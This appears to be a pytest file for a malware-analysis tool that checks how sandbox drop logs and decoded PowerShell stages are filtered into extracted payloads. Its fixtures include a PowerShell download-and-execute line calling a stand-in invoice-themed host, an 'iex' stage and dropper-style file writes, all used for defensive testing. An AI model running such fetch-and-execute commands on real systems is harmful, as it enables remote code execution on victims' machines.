"""Tiny non-code drops / stages are not nested children; the Tasks tab shows
the live concurrency."""

from __future__ import annotations

from pathlib import Path

from docutracex import decrypted


def _drop(name: str, text: str) -> dict:
    return {"kind": "drop", "name": name, "args": [text]}


def test_tiny_text_drops_are_skipped_but_code_and_real_stages_are_kept() -> None:
    log = [_drop(r"C:\Users\Public\done.txt", "ok"),
           _drop(r"C:\Users\Public\count.dat", "17"),
           _drop(r"C:\Users\Public\run.bat", "start x.exe"),            # short, but code by extension
           _drop(r"C:\Users\Public\stage.ps1", "IEX (iwr 'http://x.facturas.example/a')"),
           _drop(r"C:\Users\Public\notes.txt", "Factura 2026-0187 pendiente de pago — ver portal")]
    mods = {"javascript": {"scripts": [{"location": "dropper.js", "sandbox": {"log": log}}]},
            "powershell": {"scripts": [{"location": "a.ps1", "decoded_stages": [
                {"text": "1", "recipe": ["base64"]},
                {"text": "calc", "recipe": ["xor"]},
                {"text": "iex $s", "recipe": ["deflate"]},
                {"text": "Start-Process notepad.exe -ArgumentList 'factura.txt'", "recipe": ["base64"]}]}]}}
    got = decrypted.payloads_from(mods)
    texts = {p.get("text", "").strip() for p in got}
    assert {"ok", "17", "1", "calc"}.isdisjoint(texts)
    assert {"start x.exe", "IEX (iwr 'http://x.facturas.example/a')",
            "Factura 2026-0187 pendiente de pago — ver portal", "iex $s",
            "Start-Process notepad.exe -ArgumentList 'factura.txt'"} <= texts


def test_binary_drops_still_judged_by_magic() -> None:
    import base64
    mz = b"MZ\x90\x00" + b"\x00" * 60 + b"This is an inert DocuTraceX sample, not a program.\r\n"
    log = [{"kind": "drop_b64", "name": r"C:\Users\Public\f.exe", "args": [base64.b64encode(mz).decode()]}]
    got = decrypted.payloads_from({"javascript": {"scripts": [{"location": "d.js", "sandbox": {"log": log}}]}})
    assert len(got) == 1 and got[0].get("data", b"").startswith(b"MZ")


def test_tasks_text_is_not_stale() -> None:
    root = Path(__file__).parents[1] / "docutracex" / "web"
    html = (root / "templates" / "index.html").read_text(encoding="utf-8")
    assert "One analysis runs per instance" not in html and 'id="tasks-conc"' in html
    assert "showConcurrency(d.concurrency)" in (root / "static" / "app.js").read_text(encoding="utf-8")


def test_marker_drop_sample_end_to_end(tmp_path, monkeypatch) -> None:
    import json
    import sys

    sys.path.insert(0, str(Path(__file__).parent))
    from fastapi.testclient import TestClient
    from test_js_techniques import _analyze, _ms

    from docutracex.app import create_app
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    _, res = _analyze(TestClient(create_app()), "sample_marker_drop.js", _ms().marker_drop_js())
    js = json.loads((res / "javascript.json").read_text())
    drops = [e for sc in js["scripts"] for e in (sc.get("sandbox") or {}).get("log") or [] if e.get("kind") == "drop"]
    assert {e["name"].rsplit("\\", 1)[-1] for e in drops} >= {"inv.lock", "upd.ps1"}   # both writes recorded
    tree = json.loads((res / "nested.json").read_text())["tree"]
    names = [n["filename"] for n in tree]
    assert any(n.endswith(".ps1") for n in names), names
    assert not [n for n in tree if n.get("size_bytes", 99) < 4], names                  # no 1-byte marker child
